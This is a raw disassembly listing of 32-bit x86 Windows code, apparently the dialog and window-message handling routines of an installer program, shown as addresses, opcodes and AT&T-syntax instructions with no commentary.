  403a65:	33 c0                	xor    %eax,%eax
  403a67:	40                   	inc    %eax
  403a68:	a3 5c 04 42 00       	mov    %eax,0x42045c
  403a6d:	8b 0d a4 91 40 00    	mov    0x4091a4,%ecx
  403a73:	33 ed                	xor    %ebp,%ebp
  403a75:	8b f1                	mov    %ecx,%esi
  403a77:	c1 e6 06             	shl    $0x6,%esi
  403a7a:	03 35 a0 3e 42 00    	add    0x423ea0,%esi
  403a80:	3b cd                	cmp    %ebp,%ecx
  403a82:	7c 3e                	jl     0x403ac2
  403a84:	83 f8 01             	cmp    $0x1,%eax
  403a87:	75 31                	jne    0x403aba
  403a89:	55                   	push   %ebp
  403a8a:	ff 76 10             	push   0x10(%esi)
  403a8d:	e8 f7 d8 ff ff       	call   0x401389
  403a92:	85 c0                	test   %eax,%eax
  403a94:	74 24                	je     0x403aba
  403a96:	6a 01                	push   $0x1
  403a98:	55                   	push   %ebp
  403a99:	68 0f 04 00 00       	push   $0x40f
  403a9e:	ff 35 58 36 42 00    	push   0x423658
  403aa4:	ff 15 44 72 40 00    	call   *0x407244
  403aaa:	33 c0                	xor    %eax,%eax
  403aac:	39 2d 4c 36 42 00    	cmp    %ebp,0x42364c
  403ab2:	0f 94 c0             	sete   %al
  403ab5:	e9 a4 02 00 00       	jmp    0x403d5e
  403aba:	39 2e                	cmp    %ebp,(%esi)
  403abc:	0f 84 9a 02 00 00    	je     0x403d5c
  403ac2:	68 0b 04 00 00       	push   $0x40b
  403ac7:	e8 0f 03 00 00       	call   0x403ddb
  403acc:	a1 5c 04 42 00       	mov    0x42045c,%eax
  403ad1:	01 05 a4 91 40 00    	add    %eax,0x4091a4
  403ad7:	c1 e0 06             	shl    $0x6,%eax
  403ada:	03 f0                	add    %eax,%esi
  403adc:	a1 a4 91 40 00       	mov    0x4091a4,%eax
  403ae1:	3b 05 a4 3e 42 00    	cmp    0x423ea4,%eax
  403ae7:	75 07                	jne    0x403af0
  403ae9:	6a 01                	push   $0x1
  403aeb:	e8 1b d9 ff ff       	call   0x40140b
  403af0:	39 2d 4c 36 42 00    	cmp    %ebp,0x42364c
  403af6:	0f 85 1e 02 00 00    	jne    0x403d1a
  403afc:	a1 a4 3e 42 00       	mov    0x423ea4,%eax
  403b01:	39 05 a4 91 40 00    	cmp    %eax,0x4091a4
  403b07:	0f 83 0d 02 00 00    	jae    0x403d1a
  403b0d:	ff 76 24             	push   0x24(%esi)
  403b10:	8b 5e 14             	mov    0x14(%esi),%ebx
  403b13:	68 00 b8 42 00       	push   $0x42b800
  403b18:	e8 e2 1e 00 00       	call   0x4059ff
  403b1d:	ff 76 20             	push   0x20(%esi)
  403b20:	68 19 fc ff ff       	push   $0xfffffc19
  403b25:	57                   	push   %edi
  403b26:	e8 64 02 00 00       	call   0x403d8f
  403b2b:	ff 76 1c             	push   0x1c(%esi)
  403b2e:	68 1b fc ff ff       	push   $0xfffffc1b
  403b33:	57                   	push   %edi
  403b34:	e8 56 02 00 00       	call   0x403d8f
  403b39:	ff 76 28             	push   0x28(%esi)
  403b3c:	68 1a fc ff ff       	push   $0xfffffc1a
  403b41:	57                   	push   %edi
  403b42:	e8 48 02 00 00       	call   0x403d8f
  403b47:	6a 03                	push   $0x3
  403b49:	57                   	push   %edi
  403b4a:	ff 15 2c 72 40 00    	call   *0x40722c
  403b50:	39 2d 0c 3f 42 00    	cmp    %ebp,0x423f0c
  403b56:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  403b5a:	74 08                	je     0x403b64
  403b5c:	66 81 e3 fd fe       	and    $0xfefd,%bx
  403b61:	83 cb 04             	or     $0x4,%ebx
  403b64:	8b cb                	mov    %ebx,%ecx
  403b66:	83 e1 08             	and    $0x8,%ecx
  403b69:	51                   	push   %ecx
  403b6a:	50                   	push   %eax
  403b6b:	ff 15 60 72 40 00    	call   *0x407260
  403b71:	8b c3                	mov    %ebx,%eax
  403b73:	25 00 01 00 00       	and    $0x100,%eax
  403b78:	50                   	push   %eax
  403b79:	ff 74 24 30          	push   0x30(%esp)
  403b7d:	ff 15 3c 72 40 00    	call   *0x40723c
  403b83:	8b c3                	mov    %ebx,%eax
  403b85:	83 e0 02             	and    $0x2,%eax
  403b88:	50                   	push   %eax
  403b89:	e8 23 02 00 00       	call   0x403db1
  403b8e:	83 e3 04             	and    $0x4,%ebx
  403b91:	53                   	push   %ebx
  403b92:	ff 35 38 f4 41 00    	push   0x41f438
  403b98:	ff 15 3c 72 40 00    	call   *0x40723c
  403b9e:	3b dd                	cmp    %ebp,%ebx
  403ba0:	74 03                	je     0x403ba5
  403ba2:	55                   	push   %ebp
  403ba3:	eb 02                	jmp    0x403ba7
  403ba5:	6a 01                	push   $0x1
  403ba7:	68 60 f0 00 00       	push   $0xf060
  403bac:	55                   	push   %ebp
  403bad:	57                   	push   %edi
  403bae:	ff 15 7c 71 40 00    	call   *0x40717c
  403bb4:	50                   	push   %eax
  403bb5:	ff 15 78 71 40 00    	call   *0x407178
  403bbb:	8b 1d 44 72 40 00    	mov    0x407244,%ebx
  403bc1:	6a 01                	push   $0x1
  403bc3:	55                   	push   %ebp
  403bc4:	68 f4 00 00 00       	push   $0xf4
  403bc9:	ff 74 24 38          	push   0x38(%esp)
  403bcd:	ff d3                	call   *%ebx
  403bcf:	39 2d 0c 3f 42 00    	cmp    %ebp,0x423f0c
  403bd5:	74 13                	je     0x403bea
  403bd7:	55                   	push   %ebp
  403bd8:	6a 02                	push   $0x2
  403bda:	68 01 04 00 00       	push   $0x401
  403bdf:	57                   	push   %edi
  403be0:	ff d3                	call   *%ebx
  403be2:	ff 35 38 f4 41 00    	push   0x41f438
  403be8:	eb 06                	jmp    0x403bf0
  403bea:	ff 35 70 04 42 00    	push   0x420470
  403bf0:	e8 cf 01 00 00       	call   0x403dc4
  403bf5:	bb 78 04 42 00       	mov    $0x420478,%ebx
  403bfa:	68 80 36 42 00       	push   $0x423680
  403bff:	53                   	push   %ebx
  403c00:	e8 d8 1d 00 00       	call   0x4059dd
  403c05:	ff 76 18             	push   0x18(%esi)
  403c08:	53                   	push   %ebx
  403c09:	e8 e5 1d 00 00       	call   0x4059f3
  403c0e:	03 c3                	add    %ebx,%eax
  403c10:	50                   	push   %eax
  403c11:	e8 e9 1d 00 00       	call   0x4059ff
  403c16:	53                   	push   %ebx
  403c17:	57                   	push   %edi
  403c18:	ff 15 f4 71 40 00    	call   *0x4071f4
  403c1e:	55                   	push   %ebp
  403c1f:	ff 76 08             	push   0x8(%esi)
  403c22:	e8 62 d7 ff ff       	call   0x401389
  403c27:	85 c0                	test   %eax,%eax
  403c29:	0f 85 9d fe ff ff    	jne    0x403acc
  403c2f:	39 2e                	cmp    %ebp,(%esi)
  403c31:	0f 84 95 fe ff ff    	je     0x403acc
  403c37:	83 7e 04 05          	cmpl   $0x5,0x4(%esi)
  403c3b:	75 1d                	jne    0x403c5a
  403c3d:	39 2d 0c 3f 42 00    	cmp    %ebp,0x423f0c
  403c43:	0f 85 13 01 00 00    	jne    0x403d5c
  403c49:	39 2d 00 3f 42 00    	cmp    %ebp,0x423f00
  403c4f:	0f 85 77 fe ff ff    	jne    0x403acc
  403c55:	e9 02 01 00 00       	jmp    0x403d5c
  403c5a:	ff 35 58 36 42 00    	push   0x423658
  403c60:	ff 15 e8 71 40 00    	call   *0x4071e8
  403c66:	89 35 48 fc 41 00    	mov    %esi,0x41fc48
  403c6c:	39 2e                	cmp    %ebp,(%esi)
  403c6e:	0f 8e c5 00 00 00    	jle    0x403d39
  403c74:	8b 46 04             	mov    0x4(%esi),%eax
  403c77:	56                   	push   %esi
  403c78:	ff 34 85 a8 91 40 00 	push   0x4091a8(,%eax,4)
  403c7f:	66 8b 06             	mov    (%esi),%ax
  403c82:	66 03 05 60 36 42 00 	add    0x423660,%ax
  403c89:	57                   	push   %edi
  403c8a:	0f b7 c0             	movzwl %ax,%eax
  403c8d:	50                   	push   %eax
  403c8e:	ff 35 80 3e 42 00    	push   0x423e80
  403c94:	ff 15 ec 71 40 00    	call   *0x4071ec
  403c9a:	3b c5                	cmp    %ebp,%eax
  403c9c:	a3 58 36 42 00       	mov    %eax,0x423658
  403ca1:	0f 84 92 00 00 00    	je     0x403d39
  403ca7:	ff 76 2c             	push   0x2c(%esi)
  403caa:	6a 06                	push   $0x6
  403cac:	50                   	push   %eax
  403cad:	e8 dd 00 00 00       	call   0x403d8f
  403cb2:	8d 44 24 10          	lea    0x10(%esp),%eax
  403cb6:	50                   	push   %eax
  403cb7:	68 fa 03 00 00       	push   $0x3fa
  403cbc:	57                   	push   %edi
  403cbd:	ff 15 2c 72 40 00    	call   *0x40722c
  403cc3:	50                   	push   %eax
  403cc4:	ff 15 74 71 40 00    	call   *0x407174
  403cca:	8d 44 24 10          	lea    0x10(%esp),%eax
  403cce:	50                   	push   %eax
  403ccf:	57                   	push   %edi
  403cd0:	ff 15 70 71 40 00    	call   *0x407170
  403cd6:	6a 15                	push   $0x15
  403cd8:	55                   	push   %ebp
  403cd9:	55                   	push   %ebp
  403cda:	ff 74 24 20          	push   0x20(%esp)
  403cde:	ff 74 24 20          	push   0x20(%esp)
  403ce2:	55                   	push   %ebp
  403ce3:	ff 35 58 36 42 00    	push   0x423658
  403ce9:	ff 15 88 71 40 00    	call   *0x407188
  403cef:	55                   	push   %ebp
  403cf0:	ff 76 0c             	push   0xc(%esi)
  403cf3:	e8 91 d6 ff ff       	call   0x401389
  403cf8:	39 2d 4c 36 42 00    	cmp    %ebp,0x42364c
  403cfe:	75 5c                	jne    0x403d5c
  403d00:	6a 08                	push   $0x8
  403d02:	ff 35 58 36 42 00    	push   0x423658
  403d08:	ff 15 60 72 40 00    	call   *0x407260
  403d0e:	68 05 04 00 00       	push   $0x405
  403d13:	e8 c3 00 00 00       	call   0x403ddb
  403d18:	eb 1f                	jmp    0x403d39
  403d1a:	ff 35 58 36 42 00    	push   0x423658
  403d20:	ff 15 e8 71 40 00    	call   *0x4071e8
  403d26:	ff 35 40 f8 41 00    	push   0x41f840
  403d2c:	89 2d 88 3e 42 00    	mov    %ebp,0x423e88
  403d32:	57                   	push   %edi
  403d33:	ff 15 6c 71 40 00    	call   *0x40716c
  403d39:	39 2d 78 14 42 00    	cmp    %ebp,0x421478
  403d3f:	75 1b                	jne    0x403d5c
  403d41:	39 2d 58 36 42 00    	cmp    %ebp,0x423658
  403d47:	74 13                	je     0x403d5c
  403d49:	6a 0a                	push   $0xa
  403d4b:	57                   	push   %edi
  403d4c:	ff 15 60 72 40 00    	call   *0x407260
  403d52:	c7 05 78 14 42 00 01 	movl   $0x1,0x421478
  403d59:	00 00 00 
  403d5c:	33 c0                	xor    %eax,%eax
  403d5e:	5f                   	pop    %edi
  403d5f:	5e                   	pop    %esi
  403d60:	5d                   	pop    %ebp
  403d61:	5b                   	pop    %ebx
  403d62:	83 c4 10             	add    $0x10,%esp
  403d65:	c2 10 00             	ret    $0x10
  403d68:	83 7c 24 04 78       	cmpl   $0x78,0x4(%esp)
  403d6d:	75 06                	jne    0x403d75
  403d6f:	ff 05 4c 36 42 00    	incl   0x42364c
  403d75:	6a 00                	push   $0x0
  403d77:	ff 74 24 08          	push   0x8(%esp)
  403d7b:	68 08 04 00 00       	push   $0x408
  403d80:	ff 35 88 3e 42 00    	push   0x423e88
  403d86:	ff 15 44 72 40 00    	call   *0x407244
  403d8c:	c2 04 00             	ret    $0x4
  403d8f:	ff 74 24 0c          	push   0xc(%esp)
  403d93:	6a 00                	push   $0x0
  403d95:	e8 65 1c 00 00       	call   0x4059ff
  403d9a:	50                   	push   %eax
  403d9b:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403d9f:	05 e8 03 00 00       	add    $0x3e8,%eax
  403da4:	50                   	push   %eax
  403da5:	ff 74 24 0c          	push   0xc(%esp)
  403da9:	e8 ce 14 00 00       	call   0x40527c
  403dae:	c2 0c 00             	ret    $0xc
  403db1:	ff 74 24 04          	push   0x4(%esp)
  403db5:	ff 35 70 04 42 00    	push   0x420470
  403dbb:	ff 15 3c 72 40 00    	call   *0x40723c
  403dc1:	c2 04 00             	ret    $0x4
  403dc4:	6a 01                	push   $0x1
  403dc6:	ff 74 24 08          	push   0x8(%esp)
  403dca:	6a 28                	push   $0x28
  403dcc:	ff 35 88 3e 42 00    	push   0x423e88
  403dd2:	ff 15 44 72 40 00    	call   *0x407244
  403dd8:	c2 04 00             	ret    $0x4
  403ddb:	a1 58 36 42 00       	mov    0x423658,%eax
  403de0:	85 c0                	test   %eax,%eax
  403de2:	74 0f                	je     0x403df3
  403de4:	6a 00                	push   $0x0
  403de6:	6a 00                	push   $0x0
  403de8:	ff 74 24 0c          	push   0xc(%esp)
  403dec:	50                   	push   %eax
  403ded:	ff 15 44 72 40 00    	call   *0x407244
  403df3:	c2 04 00             	ret    $0x4
  403df6:	55                   	push   %ebp
  403df7:	8b ec                	mov    %esp,%ebp
  403df9:	83 ec 0c             	sub    $0xc,%esp
  403dfc:	8b 45 08             	mov    0x8(%ebp),%eax
  403dff:	56                   	push   %esi
  403e00:	05 cd fe ff ff       	add    $0xfffffecd,%eax
  403e05:	83 f8 05             	cmp    $0x5,%eax
  403e08:	0f 87 8e 00 00 00    	ja     0x403e9c
  403e0e:	6a eb                	push   $0xffffffeb
  403e10:	ff 75 10             	push   0x10(%ebp)
  403e13:	ff 15 90 71 40 00    	call   *0x407190
  403e19:	8b f0                	mov    %eax,%esi
  403e1b:	85 f6                	test   %esi,%esi
  403e1d:	74 7d                	je     0x403e9c
  403e1f:	f6 46 14 02          	testb  $0x2,0x14(%esi)
  403e23:	8b 06                	mov    (%esi),%eax
  403e25:	57                   	push   %edi
  403e26:	8b 3d 8c 71 40 00    	mov    0x40718c,%edi
  403e2c:	74 03                	je     0x403e31
  403e2e:	50                   	push   %eax
  403e2f:	ff d7                	call   *%edi
  403e31:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  403e35:	74 0a                	je     0x403e41
  403e37:	50                   	push   %eax
  403e38:	ff 75 0c             	push   0xc(%ebp)
  403e3b:	ff 15 54 70 40 00    	call   *0x407054
  403e41:	ff 76 10             	push   0x10(%esi)
  403e44:	ff 75 0c             	push   0xc(%ebp)
  403e47:	ff 15 50 70 40 00    	call   *0x407050
  403e4d:	8b 46 04             	mov    0x4(%esi),%eax
  403e50:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  403e54:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403e57:	74 06                	je     0x403e5f
  403e59:	50                   	push   %eax
  403e5a:	ff d7                	call   *%edi
  403e5c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403e5f:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  403e63:	5f                   	pop    %edi
  403e64:	74 0a                	je     0x403e70
  403e66:	50                   	push   %eax
  403e67:	ff 75 0c             	push   0xc(%ebp)
  403e6a:	ff 15 3c 70 40 00    	call   *0x40703c
  403e70:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  403e74:	74 21                	je     0x403e97
  403e76:	8b 46 08             	mov    0x8(%esi),%eax
  403e79:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403e7c:	8b 46 0c             	mov    0xc(%esi),%eax
  403e7f:	85 c0                	test   %eax,%eax
  403e81:	74 07                	je     0x403e8a
  403e83:	50                   	push   %eax
  403e84:	ff 15 44 70 40 00    	call   *0x407044
  403e8a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403e8d:	50                   	push   %eax
  403e8e:	ff 15 48 70 40 00    	call   *0x407048
  403e94:	89 46 0c             	mov    %eax,0xc(%esi)
  403e97:	8b 46 0c             	mov    0xc(%esi),%eax
  403e9a:	eb 02                	jmp    0x403e9e
  403e9c:	33 c0                	xor    %eax,%eax
  403e9e:	5e                   	pop    %esi
  403e9f:	c9                   	leave
  403ea0:	c2 0c 00             	ret    $0xc
  403ea3:	55                   	push   %ebp
  403ea4:	8b ec                	mov    %esp,%ebp
  403ea6:	8b 45 08             	mov    0x8(%ebp),%eax
  403ea9:	8b 0d 3c f4 41 00    	mov    0x41f43c,%ecx
  403eaf:	ff 75 10             	push   0x10(%ebp)
  403eb2:	03 c8                	add    %eax,%ecx
  403eb4:	51                   	push   %ecx
  403eb5:	ff 75 0c             	push   0xc(%ebp)
  403eb8:	ff 15 b8 70 40 00    	call   *0x4070b8
  403ebe:	ff 75 0c             	push   0xc(%ebp)
  403ec1:	e8 2d 1b 00 00       	call   0x4059f3
  403ec6:	8b 4d 14             	mov    0x14(%ebp),%ecx
  403ec9:	89 01                	mov    %eax,(%ecx)
  403ecb:	01 05 3c f4 41 00    	add    %eax,0x41f43c
  403ed1:	33 c0                	xor    %eax,%eax
  403ed3:	5d                   	pop    %ebp
  403ed4:	c2 10 00             	ret    $0x10
  403ed7:	55                   	push   %ebp
  403ed8:	8b ec                	mov    %esp,%ebp
  403eda:	83 ec 0c             	sub    $0xc,%esp
  403edd:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  403ee4:	53                   	push   %ebx
  403ee5:	56                   	push   %esi
  403ee6:	57                   	push   %edi
  403ee7:	0f 85 0d 01 00 00    	jne    0x403ffa
  403eed:	8b 5d 14             	mov    0x14(%ebp),%ebx
  403ef0:	8b 7b 30             	mov    0x30(%ebx),%edi
  403ef3:	85 ff                	test   %edi,%edi
  403ef5:	7d 11                	jge    0x403f08
  403ef7:	8b 0d 5c 36 42 00    	mov    0x42365c,%ecx
  403efd:	8d 04 bd 04 00 00 00 	lea    0x4(,%edi,4),%eax
  403f04:	2b c8                	sub    %eax,%ecx
  403f06:	8b 39                	mov    (%ecx),%edi
  403f08:	a1 b8 3e 42 00       	mov    0x423eb8,%eax
  403f0d:	ff 73 34             	push   0x34(%ebx)
  403f10:	03 f8                	add    %eax,%edi
  403f12:	6a 22                	push   $0x22
  403f14:	0f be 07             	movsbl (%edi),%eax
  403f17:	89 45 14             	mov    %eax,0x14(%ebp)
  403f1a:	8b 43 14             	mov    0x14(%ebx),%eax
  403f1d:	ff 75 08             	push   0x8(%ebp)
  403f20:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  403f24:	8b f0                	mov    %eax,%esi
  403f26:	47                   	inc    %edi
  403f27:	f7 d6                	not    %esi
  403f29:	c1 ee 05             	shr    $0x5,%esi
  403f2c:	83 e6 01             	and    $0x1,%esi
  403f2f:	83 e0 01             	and    $0x1,%eax
  403f32:	89 7d f4             	mov    %edi,-0xc(%ebp)
  403f35:	c7 45 fc a3 3e 40 00 	movl   $0x403ea3,-0x4(%ebp)
  403f3c:	0b f0                	or     %eax,%esi
  403f3e:	e8 4c fe ff ff       	call   0x403d8f
  403f43:	ff 73 38             	push   0x38(%ebx)
  403f46:	6a 23                	push   $0x23
  403f48:	ff 75 08             	push   0x8(%ebp)
  403f4b:	e8 3f fe ff ff       	call   0x403d8f
  403f50:	33 c0                	xor    %eax,%eax
  403f52:	6a 01                	push   $0x1
  403f54:	85 f6                	test   %esi,%esi
  403f56:	0f 94 c0             	sete   %al
  403f59:	05 0a 04 00 00       	add    $0x40a,%eax
  403f5e:	50                   	push   %eax
  403f5f:	ff 75 08             	push   0x8(%ebp)
  403f62:	ff 15 9c 71 40 00    	call   *0x40719c
  403f68:	56                   	push   %esi
  403f69:	e8 43 fe ff ff       	call   0x403db1
  403f6e:	68 e8 03 00 00       	push   $0x3e8
  403f73:	ff 75 08             	push   0x8(%ebp)
  403f76:	ff 15 2c 72 40 00    	call   *0x40722c
  403f7c:	8b d8                	mov    %eax,%ebx
  403f7e:	53                   	push   %ebx
  403f7f:	e8 40 fe ff ff       	call   0x403dc4
  403f84:	8b 35 44 72 40 00    	mov    0x407244,%esi
  403f8a:	6a 00                	push   $0x0
  403f8c:	6a 01                	push   $0x1
  403f8e:	68 5b 04 00 00       	push   $0x45b
  403f93:	53                   	push   %ebx
  403f94:	ff d6                	call   *%esi
  403f96:	a1 90 3e 42 00       	mov    0x423e90,%eax
  403f9b:	8b 40 68             	mov    0x68(%eax),%eax
  403f9e:	85 c0                	test   %eax,%eax
  403fa0:	7d 09                	jge    0x403fab
  403fa2:	f7 d8                	neg    %eax
  403fa4:	50                   	push   %eax
  403fa5:	ff 15 8c 71 40 00    	call   *0x40718c
  403fab:	50                   	push   %eax
  403fac:	6a 00                	push   $0x0
  403fae:	68 43 04 00 00       	push   $0x443
  403fb3:	53                   	push   %ebx
  403fb4:	ff d6                	call   *%esi
  403fb6:	68 00 00 01 04       	push   $0x4010000
  403fbb:	6a 00                	push   $0x0
  403fbd:	68 45 04 00 00       	push   $0x445
  403fc2:	53                   	push   %ebx
  403fc3:	ff d6                	call   *%esi
  403fc5:	83 25 3c f4 41 00 00 	andl   $0x0,0x41f43c
  403fcc:	57                   	push   %edi
  403fcd:	e8 21 1a 00 00       	call   0x4059f3
  403fd2:	50                   	push   %eax
  403fd3:	6a 00                	push   $0x0
  403fd5:	68 35 04 00 00       	push   $0x435
  403fda:	53                   	push   %ebx
  403fdb:	ff d6                	call   *%esi
  403fdd:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403fe0:	50                   	push   %eax
  403fe1:	ff 75 14             	push   0x14(%ebp)
  403fe4:	68 49 04 00 00       	push   $0x449
  403fe9:	53                   	push   %ebx
  403fea:	ff d6                	call   *%esi
  403fec:	83 25 58 04 42 00 00 	andl   $0x0,0x420458
  403ff3:	33 c0                	xor    %eax,%eax
  403ff5:	e9 61 01 00 00       	jmp    0x40415b
  403ffa:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404001:	8b 1d 2c 72 40 00    	mov    0x40722c,%ebx
  404007:	8b 35 44 72 40 00    	mov    0x407244,%esi
  40400d:	75 5a                	jne    0x404069
  40400f:	8b 45 10             	mov    0x10(%ebp),%eax
  404012:	c1 e8 10             	shr    $0x10,%eax
  404015:	66 85 c0             	test   %ax,%ax
  404018:	0f 85 2e 01 00 00    	jne    0x40414c
  40401e:	33 c0                	xor    %eax,%eax
  404020:	39 05 58 04 42 00    	cmp    %eax,0x420458
  404026:	0f 85 20 01 00 00    	jne    0x40414c
  40402c:	8b 0d 48 fc 41 00    	mov    0x41fc48,%ecx
  404032:	8d 79 14             	lea    0x14(%ecx),%edi
  404035:	f6 07 20             	testb  $0x20,(%edi)
  404038:	0f 84 0e 01 00 00    	je     0x40414c
  40403e:	50                   	push   %eax
  40403f:	50                   	push   %eax
  404040:	68 f0 00 00 00       	push   $0xf0
  404045:	68 0a 04 00 00       	push   $0x40a
  40404a:	ff 75 08             	push   0x8(%ebp)
  40404d:	ff d3                	call   *%ebx
  40404f:	50                   	push   %eax
  404050:	ff d6                	call   *%esi
  404052:	8b 0f                	mov    (%edi),%ecx
  404054:	83 e0 01             	and    $0x1,%eax
  404057:	83 e1 fe             	and    $0xfffffffe,%ecx
  40405a:	50                   	push   %eax
  40405b:	0b c8                	or     %eax,%ecx
  40405d:	89 0f                	mov    %ecx,(%edi)
  40405f:	e8 4d fd ff ff       	call   0x403db1
  404064:	e8 f9 00 00 00       	call   0x404162
  404069:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  40406d:	0f 85 ca 00 00 00    	jne    0x40413d
  404073:	68 e8 03 00 00       	push   $0x3e8
  404078:	ff 75 08             	push   0x8(%ebp)
  40407b:	ff d3                	call   *%ebx
  40407d:	8b 7d 14             	mov    0x14(%ebp),%edi
  404080:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  404087:	75 72                	jne    0x4040fb
  404089:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  404090:	75 69                	jne    0x4040fb
  404092:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  404095:	8b 57 18             	mov    0x18(%edi),%edx
  404098:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40409b:	2b ca                	sub    %edx,%ecx
  40409d:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  4040a3:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4040a6:	c7 45 fc 20 2e 42 00 	movl   $0x422e20,-0x4(%ebp)
  4040ad:	73 4c                	jae    0x4040fb
  4040af:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4040b2:	51                   	push   %ecx
  4040b3:	6a 00                	push   $0x0
  4040b5:	68 4b 04 00 00       	push   $0x44b
  4040ba:	50                   	push   %eax
  4040bb:	ff d6                	call   *%esi
  4040bd:	8b 3d 98 71 40 00    	mov    0x407198,%edi
  4040c3:	68 02 7f 00 00       	push   $0x7f02
  4040c8:	6a 00                	push   $0x0
  4040ca:	ff d7                	call   *%edi
  4040cc:	8b 1d 94 71 40 00    	mov    0x407194,%ebx
  4040d2:	50                   	push   %eax
  4040d3:	ff d3                	call   *%ebx
  4040d5:	6a 01                	push   $0x1
  4040d7:	6a 00                	push   $0x0
  4040d9:	6a 00                	push   $0x0
  4040db:	ff 75 fc             	push   -0x4(%ebp)
  4040de:	68 c4 91 40 00       	push   $0x4091c4
  4040e3:	ff 75 08             	push   0x8(%ebp)
  4040e6:	ff 15 5c 71 40 00    	call   *0x40715c
  4040ec:	68 00 7f 00 00       	push   $0x7f00
  4040f1:	6a 00                	push   $0x0
  4040f3:	ff d7                	call   *%edi
  4040f5:	50                   	push   %eax
  4040f6:	ff d3                	call   *%ebx
  4040f8:	8b 7d 14             	mov    0x14(%ebp),%edi
  4040fb:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  404102:	75 4b                	jne    0x40414f
  404104:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  40410b:	75 42                	jne    0x40414f
  40410d:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  404111:	75 11                	jne    0x404124
  404113:	6a 00                	push   $0x0
  404115:	6a 01                	push   $0x1
  404117:	68 11 01 00 00       	push   $0x111
  40411c:	ff 35 88 3e 42 00    	push   0x423e88
  404122:	ff d6                	call   *%esi
  404124:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  404128:	75 0e                	jne    0x404138
  40412a:	6a 00                	push   $0x0
  40412c:	6a 00                	push   $0x0
  40412e:	6a 10                	push   $0x10
  404130:	ff 35 88 3e 42 00    	push   0x423e88
  404136:	ff d6                	call   *%esi
  404138:	33 c0                	xor    %eax,%eax
  40413a:	40                   	inc    %eax
  40413b:	eb 1e                	jmp    0x40415b
  40413d:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404144:	75 06                	jne    0x40414c
  404146:	ff 05 58 04 42 00    	incl   0x420458
  40414c:	8b 7d 14             	mov    0x14(%ebp),%edi
  40414f:	57                   	push   %edi
  404150:	ff 75 10             	push   0x10(%ebp)
  404153:	ff 75 0c             	push   0xc(%ebp)
  404156:	e8 9b fc ff ff       	call   0x403df6
  40415b:	5f                   	pop    %edi
  40415c:	5e                   	pop    %esi
  40415d:	5b                   	pop    %ebx
  40415e:	c9                   	leave
  40415f:	c2 10 00             	ret    $0x10
  404162:	83 3d 0c 3f 42 00 00 	cmpl   $0x0,0x423f0c
  404169:	a1 38 f4 41 00       	mov    0x41f438,%eax
  40416e:	75 05                	jne    0x404175
  404170:	a1 70 04 42 00       	mov    0x420470,%eax
  404175:	6a 01                	push   $0x1
  404177:	6a 01                	push   $0x1
  404179:	68 f4 00 00 00       	push   $0xf4
  40417e:	50                   	push   %eax
  40417f:	ff 15 44 72 40 00    	call   *0x407244
  404185:	c3                   	ret
  404186:	55                   	push   %ebp
  404187:	8b ec                	mov    %esp,%ebp
  404189:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404190:	56                   	push   %esi
  404191:	8b 75 14             	mov    0x14(%ebp),%esi
  404194:	75 26                	jne    0x4041bc
  404196:	ff 76 30             	push   0x30(%esi)
  404199:	6a 1d                	push   $0x1d
  40419b:	ff 75 08             	push   0x8(%ebp)
  40419e:	e8 ec fb ff ff       	call   0x403d8f
  4041a3:	8b 46 3c             	mov    0x3c(%esi),%eax
  4041a6:	c1 e0 0a             	shl    $0xa,%eax
  4041a9:	05 00 40 42 00       	add    $0x424000,%eax
  4041ae:	50                   	push   %eax
  4041af:	68 e8 03 00 00       	push   $0x3e8
  4041b4:	ff 75 08             	push   0x8(%ebp)
  4041b7:	e8 c0 10 00 00       	call   0x40527c
  4041bc:	56                   	push   %esi
  4041bd:	ff 75 10             	push   0x10(%ebp)
  4041c0:	ff 75 0c             	push   0xc(%ebp)
  4041c3:	e8 2e fc ff ff       	call   0x403df6
  4041c8:	5e                   	pop    %esi
  4041c9:	5d                   	pop    %ebp
  4041ca:	c2 10 00             	ret    $0x10
  4041cd:	55                   	push   %ebp
  4041ce:	8b ec                	mov    %esp,%ebp
  4041d0:	83 ec 48             	sub    $0x48,%esp
  4041d3:	a1 48 fc 41 00       	mov    0x41fc48,%eax
  4041d8:	53                   	push   %ebx
  4041d9:	56                   	push   %esi
  4041da:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4041dd:	8b 70 3c             	mov    0x3c(%eax),%esi
  4041e0:	8b 40 38             	mov    0x38(%eax),%eax
  4041e3:	c1 e6 0a             	shl    $0xa,%esi
  4041e6:	81 c6 00 40 42 00    	add    $0x424000,%esi
  4041ec:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  4041f3:	57                   	push   %edi
  4041f4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4041f7:	bb fb 03 00 00       	mov    $0x3fb,%ebx
  4041fc:	75 0d                	jne    0x40420b
  4041fe:	56                   	push   %esi
  4041ff:	53                   	push   %ebx
  404200:	e8 7d 10 00 00       	call   0x405282
  404205:	56                   	push   %esi
  404206:	e8 34 1a 00 00       	call   0x405c3f
